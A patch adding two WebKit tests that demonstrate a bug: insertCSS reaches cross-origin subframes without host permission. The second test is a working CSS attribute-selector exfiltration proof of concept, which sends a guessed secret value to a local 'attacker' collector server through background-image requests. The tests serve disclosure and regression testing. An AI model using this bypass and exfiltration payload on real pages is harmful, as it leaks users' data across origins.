@@ -1,0 +1,238 @@
+diff -ruN a/Tools/TestWebKitAPI/Tests/WebKit/WKWebView/WKWebExtensionAPIScripting.mm b/Tools/TestWebKitAPI/Tests/WebKit/WKWebView/WKWebExtensionAPIScripting.mm
+--- a/Tools/TestWebKitAPI/Tests/WebKit/WKWebView/WKWebExtensionAPIScripting.mm	2026-10-12 06:14:48.177740694 +0000
++++ b/Tools/TestWebKitAPI/Tests/WebKit/WKWebView/WKWebExtensionAPIScripting.mm	2026-10-13 05:56:50.452207619 +0000
+@@ -741,6 +741,234 @@
+     [manager run];
+ }
+ 
++// Companion to InsertCSSInAllFramesWithCrossSiteFrame above, with one change: the extension is granted
++// host permission for ONLY the main frame's origin (127.0.0.1), never for the cross-site subframe's
++// origin (localhost). executeScript() checks host permission per frame before running anything in it
++// (see executeScript() in WebExtensionDynamicScriptsCocoa.mm) and correctly skips frames it has no
++// permission for. insertCSS(), reached through the same target.allFrames path, performs no equivalent
++// per-frame check anywhere in its call chain (scriptingInsertCSS / tabsInsertCSS / injectStyleSheets),
++// so the injected CSS currently reaches the un-permitted subframe too. The subframe checks its own
++// computed style and reports it to the main frame via postMessage, independent of the extension's own
++// (separately, correctly gated) executeScript, so this check cannot be confused by that other gate.
++// On current WebKit this test is expected to FAIL with a message starting "VULNERABLE:"; it should
++// pass once insertCSS gains the same per-frame permission check executeScript already has. A timeout
++// without ever getting a report is a SEPARATE, explicit failure -- it means the harness didn't get an
++// answer in time, not that the bug was confirmed either way.
++TEST(WKWebExtensionAPIScripting, InsertCSSInAllFramesRespectsPerFramePermissions)
++{
++    SetForScope siteIsolation { Util::shouldEnableSiteIsolationForWebExtensionsTest, true };
++
++    auto *manifest = @{
++        @"manifest_version": @3,
++
++        @"name": @"Scripting Permission Scope Test",
++        @"description": @"Scripting Permission Scope Test",
++        @"version": @"1",
++
++        @"permissions": @[ @"scripting" ],
++        @"host_permissions": @[ @"*://127.0.0.1/*" ],
++
++        @"background": @{
++            @"scripts": @[ @"background.js" ],
++            @"type": @"module",
++            @"persistent": @NO,
++        },
++    };
++
++    TestWebKitAPI::HTTPServer server({
++        { "/"_s, { { { "Content-Type"_s, "text/html"_s } },
++            "<script>"
++            "window.__subframeColor = null;"
++            "addEventListener('message', (e) => { if (e.data && e.data.source === 'poc-subframe') window.__subframeColor = e.data.color; });"
++            "onload = () => { const frame = document.createElement('iframe'); frame.src = 'http://localhost:' + window.location.port + '/frame.html'; document.body.appendChild(frame); };"
++            "</script>"_s } },
++        { "/frame.html"_s, { { { "Content-Type"_s, "text/html"_s } },
++            "<body style='background-color: blue'>"
++            "<script>"
++            "(async () => {"
++            "  for (let i = 0; i < 100; i++) {"
++            "    if (getComputedStyle(document.body).backgroundColor !== 'rgb(0, 0, 255)') break;"
++            "    await new Promise((resolve) => setTimeout(resolve, 50));"
++            "  }"
++            "  parent.postMessage({ source: 'poc-subframe', color: getComputedStyle(document.body).backgroundColor }, '*');"
++            "})();"
++            "</script></body>"_s } },
++    }, TestWebKitAPI::HTTPServer::Protocol::Http);
++
++    auto *backgroundScript = Util::constructScript(@[
++        @"const pinkValue = 'rgb(255, 192, 203)'",
++        @"const blueValue = 'rgb(0, 0, 255)'",
++
++        @"function getBackgroundColor() { return window.getComputedStyle(document.body).getPropertyValue('background-color') }",
++        @"function getReportedSubframeColor() { return window.__subframeColor }",
++
++        @"browser.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {",
++        @"  if (tab.status !== 'complete')",
++        @"    return",
++
++        @"  for (let attempt = 0; attempt < 200; ++attempt) {",
++        @"    const results = await browser.scripting.executeScript({ target: { tabId, allFrames: true }, func: getBackgroundColor })",
++        @"    if (results.length === 2)",
++        @"      break",
++        @"    await new Promise((resolve) => setTimeout(resolve, 50))",
++        @"  }",
++
++        @"  await browser.scripting.insertCSS({ target: { tabId, allFrames: true }, css: 'body { background-color: pink !important }' })",
++
++        // The subframe's own safety loop can take up to ~5s by itself before it reports anything
++        // (it only gives up and posts once it's checked 100 times at 50ms apart), so poll for the
++        // report rather than checking once after a fixed delay -- a null/missing report means the
++        // harness hasn't heard back yet, not that the subframe was proven safe.
++        @"  let subframeColor = null",
++        @"  for (let attempt = 0; attempt < 40; ++attempt) {",
++        // world: 'MAIN' is required here -- window.__subframeColor is set by the real page's
++        // own inline script (main world) via postMessage; executeScript defaults to an
++        // isolated world with its own separate window, which would never see it.
++        @"    subframeColor = (await browser.scripting.executeScript({ target: { tabId, allFrames: false }, world: 'MAIN', func: getReportedSubframeColor }))[0]?.result",
++        @"    if (subframeColor !== null && subframeColor !== undefined)",
++        @"      break",
++        @"    await new Promise((resolve) => setTimeout(resolve, 500))",
++        @"  }",
++
++        @"  const mainFrameColor = (await browser.scripting.executeScript({ target: { tabId, allFrames: false }, func: getBackgroundColor }))[0]?.result",
++        @"  browser.test.assertEq(mainFrameColor, pinkValue, 'Main frame has permission and should be styled by insertCSS')",
++
++        @"  browser.test.assertTrue(subframeColor !== null && subframeColor !== undefined, 'INCONCLUSIVE: the subframe never reported a color within 20s -- this is a harness/timing problem, not a verdict on the bug either way')",
++
++        @"  browser.test.assertEq(subframeColor, blueValue, 'VULNERABLE: cross-origin subframe has NO permission for this extension, but insertCSS styled it anyway (reported ' + subframeColor + ')')",
++
++        @"  browser.test.notifyPass()",
++        @"})",
++
++        @"browser.test.sendMessage('Load Tab')",
++    ]);
++
++    auto *resources = @{ @"background.js": backgroundScript };
++
++    auto manager = Util::loadExtension(manifest, resources);
++
++    auto *urlRequest = server.requestWithLocalhost();
++    auto *url = urlRequest.URL;
++
++    auto *matchPattern = [WKWebExtensionMatchPattern matchPatternWithScheme:url.scheme host:url.host path:@"/*"];
++    [manager.get().context setPermissionStatus:WKWebExtensionContextPermissionStatusGrantedExplicitly forMatchPattern:matchPattern];
++
++    [manager runUntilTestMessage:@"Load Tab"];
++
++    [manager.get().defaultTab.webView loadRequest:urlRequest];
++
++    [manager run];
++}
++
++// Companion to InsertCSSInAllFramesRespectsPerFramePermissions above. That test proves insertCSS
++// can change a cross-origin subframe's rendering despite zero permission; this one proves that
++// bypass has a concrete, demonstrable data-exfiltration consequence, not just a cosmetic one.
++// The cross-origin subframe holds a test "secret" value in an <input value> attribute. The
++// extension -- still granted permission for ONLY the main frame's origin -- injects CSS
++// attribute-selector rules into the subframe via the same unchecked insertCSS path. Each
++// candidate rule's background-image URL encodes a different guessed value; browsers eagerly
++// fetch a background-image URL the moment its rule's selector matches, regardless of whether
++// the image itself loads successfully, which is the real, published basis of CSS-only
++// exfiltration attacks. A second, independent HTTP server (the "attacker's" collection
++// endpoint, a different origin/port than either frame) observes which request actually
++// arrives. A real HTTP request for the correct value, and none for the decoys, proves genuine
++// character-level data extraction through a pure CSS side-channel with zero script access to
++// the subframe at any point -- not an assumption about what might be possible.
++TEST(WKWebExtensionAPIScripting, InsertCSSExfiltratesCrossOriginAttributeData)
++{
++    SetForScope siteIsolation { Util::shouldEnableSiteIsolationForWebExtensionsTest, true };
++
++    auto *manifest = @{
++        @"manifest_version": @3,
++
++        @"name": @"Scripting Exfiltration PoC",
++        @"description": @"Scripting Exfiltration PoC",
++        @"version": @"1",
++
++        @"permissions": @[ @"scripting" ],
++        @"host_permissions": @[ @"*://127.0.0.1/*" ],
++
++        @"background": @{
++            @"scripts": @[ @"background.js" ],
++            @"type": @"module",
++            @"persistent": @NO,
++        },
++    };
++
++    // The independent "attacker" collection endpoint. A real exfiltration target would be a
++    // wholly separate origin; here it's simply a second local server, which is sufficient to
++    // prove a real, independent network request happens -- the subframe's own origin/process
++    // never sees or handles this request at all.
++    __block String leakedPath;
++    __block bool gotRequest = false;
++    TestWebKitAPI::HTTPServer collector([&leakedPath, &gotRequest](TestWebKitAPI::Connection connection) {
++        connection.receiveHTTPRequest([&leakedPath, &gotRequest, connection](Vector<char>&& request) {
++            leakedPath = TestWebKitAPI::HTTPServer::parsePath(request);
++            gotRequest = true;
++            connection.send(TestWebKitAPI::HTTPResponse("ok"_s).serialize());
++        });
++    });
++    uint16_t collectorPort = collector.port();
++
++    TestWebKitAPI::HTTPServer server({
++        { "/"_s, { { { "Content-Type"_s, "text/html"_s } },
++            "<script>onload = () => { const frame = document.createElement('iframe'); frame.src = 'http://localhost:' + window.location.port + '/frame.html'; document.body.appendChild(frame); };</script>"_s } },
++        { "/frame.html"_s, { { { "Content-Type"_s, "text/html"_s } },
++            "<body style='background-color: blue'><input id='secret' value='X'></body>"_s } },
++    }, TestWebKitAPI::HTTPServer::Protocol::Http);
++
++    auto *backgroundScript = Util::constructScript(@[
++        [NSString stringWithFormat:@"const collectorPort = %u", (unsigned)collectorPort],
++
++        @"function getBackgroundColor() { return window.getComputedStyle(document.body).getPropertyValue('background-color') }",
++
++        @"browser.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {",
++        @"  if (tab.status !== 'complete')",
++        @"    return",
++
++        @"  for (let attempt = 0; attempt < 200; ++attempt) {",
++        @"    const results = await browser.scripting.executeScript({ target: { tabId, allFrames: true }, func: getBackgroundColor })",
++        @"    if (results.length === 2)",
++        @"      break",
++        @"    await new Promise((resolve) => setTimeout(resolve, 50))",
++        @"  }",
++
++        // One correct guess ('X', the subframe's real secret) plus four decoys. Each rule's
++        // background-image points at a distinct path on the independent collector server.
++        @"  const guesses = ['a', 'b', 'X', 'Y', 'Z']",
++        @"  const css = guesses.map((g) => `input[value^=\"${g}\"] { background-image: url(http://127.0.0.1:${collectorPort}/leak-${g}) }`).join(' ')",
++
++        @"  await browser.scripting.insertCSS({ target: { tabId, allFrames: true }, css })",
++
++        @"  browser.test.sendMessage('Injected')",
++        @"})",
++
++        @"browser.test.sendMessage('Load Tab')",
++    ]);
++
++    auto *resources = @{ @"background.js": backgroundScript };
++
++    auto manager = Util::loadExtension(manifest, resources);
++
++    auto *urlRequest = server.requestWithLocalhost();
++    auto *url = urlRequest.URL;
++
++    auto *matchPattern = [WKWebExtensionMatchPattern matchPatternWithScheme:url.scheme host:url.host path:@"/*"];
++    [manager.get().context setPermissionStatus:WKWebExtensionContextPermissionStatusGrantedExplicitly forMatchPattern:matchPattern];
++
++    [manager runUntilTestMessage:@"Load Tab"];
++
++    [manager.get().defaultTab.webView loadRequest:urlRequest];
++
++    [manager runUntilTestMessage:@"Injected"];
++
++    // Give the subframe's eager background-image fetch time to actually reach the collector.
++    TestWebKitAPI::Util::run(&gotRequest);
++
++    EXPECT_TRUE(gotRequest);
++    EXPECT_WK_STREQ(leakedPath, "/leak-X"_s);
++}
++
+ TEST(WKWebExtensionAPIScripting, InsertAndRemoveCSSWithFrameIds)
+ {
+     TestWebKitAPI::HTTPServer server({
